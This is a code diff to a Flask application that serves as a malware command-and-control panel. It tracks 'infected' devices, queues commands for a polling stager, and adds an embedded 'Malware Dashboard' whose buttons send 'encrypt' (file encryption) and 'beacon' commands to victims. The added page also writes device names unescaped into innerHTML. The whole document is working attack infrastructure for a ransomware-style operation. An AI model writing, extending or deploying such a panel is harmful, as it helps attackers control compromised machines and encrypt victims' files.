@@ -1,4 +1,4 @@
-from flask import Flask, jsonify, request
+from flask import Flask, jsonify, request, render_template_string
 import json
 
 app = Flask(__name__)
@@ -8,12 +8,63 @@ devices = [
     {'id': '2', 'name': 'Device 2', 'status': 'infected', 'ip': '192.168.1.3'},
 ]
 
-# Command queue: device_id -> command string
 commands = {}
 
+# Dashboard HTML (embedded)
+dashboard_html = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malware Dashboard</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .device { border: 1px solid #ccc; padding: 10px; margin: 10px 0; }
+        button { margin: 5px; padding: 5px 10px; }
+    </style>
+</head>
+<body>
+    <h1>Malware Dashboard</h1>
+    <div id="devices"></div>
+
+    <script>
+        async function fetchDevices() {
+            const res = await fetch('/devices');
+            const devices = await res.json();
+            const container = document.getElementById('devices');
+            container.innerHTML = '';
+            devices.forEach(d => {
+                const div = document.createElement('div');
+                div.className = 'device';
+                div.innerHTML = `
+                    <h3>${d.name}</h3>
+                    <p>Status: ${d.status}</p>
+                    <p>IP: ${d.ip}</p>
+                    <button onclick="sendCommand('${d.id}', 'encrypt')">Encrypt Files</button>
+                    <button onclick="sendCommand('${d.id}', 'beacon')">Send Beacon</button>
+                `;
+                container.appendChild(div);
+            });
+        }
+
+        async function sendCommand(id, cmd) {
+            await fetch('/command', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({deviceId: id, command: cmd})
+            });
+            fetchDevices();
+        }
+
+        setInterval(fetchDevices, 5000);
+        fetchDevices();
+    </script>
+</body>
+</html>
+'''
+
 @app.route('/')
-def index():
-    return 'Device Manager API is running.'
+def dashboard():
+    return render_template_string(dashboard_html)
 
 @app.route('/devices', methods=['GET', 'POST'])
 def handle_devices():
@@ -35,14 +86,10 @@ def handle_command():
     data = request.get_json()
     if not data:
         return jsonify({'error': 'Invalid JSON'}), 400
-
     device_id = data.get('deviceId')
     command = data.get('command')
-
-    # If command is provided, store it (dashboard -> server)
     if command:
         commands[device_id] = command
-        # Update device status
         for device in devices:
             if device['id'] == device_id:
                 if command == 'encrypt':
@@ -51,13 +98,8 @@ def handle_command():
                     device['status'] = 'beaconing'
                 break
         return jsonify({'success': True, 'message': 'Command stored'})
-
-    # If no command, retrieve pending command for this device (stager -> server)
     pending = commands.get(device_id)
-    if pending:
-        return jsonify({'command': pending})
-    else:
-        return jsonify({'command': None})
+    return jsonify({'command': pending})
 
 @app.route('/beacon', methods=['GET', 'POST'])
 def beacon():
